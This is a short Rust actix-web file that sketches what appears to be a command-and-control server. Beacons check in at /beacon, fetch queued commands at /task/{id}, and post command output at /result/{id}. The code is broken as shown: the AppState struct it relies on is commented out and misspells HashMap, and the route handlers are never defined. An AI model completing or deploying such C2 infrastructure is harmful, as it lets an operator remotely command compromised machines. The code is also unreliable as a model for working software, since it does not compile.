use actix_web::{web, App, HttpServer, HttpResponse, Responder};
use serde::{Serialize, Deserialize};
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use uuid::Uuid;
mod handlers;

/*
    defining core types
    */

#[derive(Serialize, Deserialize, Clone)]
struct Beacon {
    id: Uuid,
    hostname: String,
    last_seen: String,
}

#[derive(Serialize, Deserialize, Clone)]
struct Task {
    command: String,
}

#[derive(Serialize, Deserialize, Clone)]
struct ResultData{
    output: String,
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    let state = web::Data::new(AppState {
        beacons: Mutex::new(HashMap::new()),
        tasks: Mutex::new(HashMap::new()),
    });

    HttpServer::new(move || {
        App::new()
            .app_data(state.clone())
            .route("/beacon", web::post().to(beacon))
            .route("/task/{id}", web::get().to(get_task))
            .route("/result/{id}", web::post().to(post_result))
    })
    .bind("0.0.0.0:8080")?
    .run()
    .await
}

// setting up state
/*
struct AppState {
    beacons: Mutex<HashMap<Uuid, Beacon>>,
    tasks: Mutex<Hashing<Uuid, Task>>,
}
    */
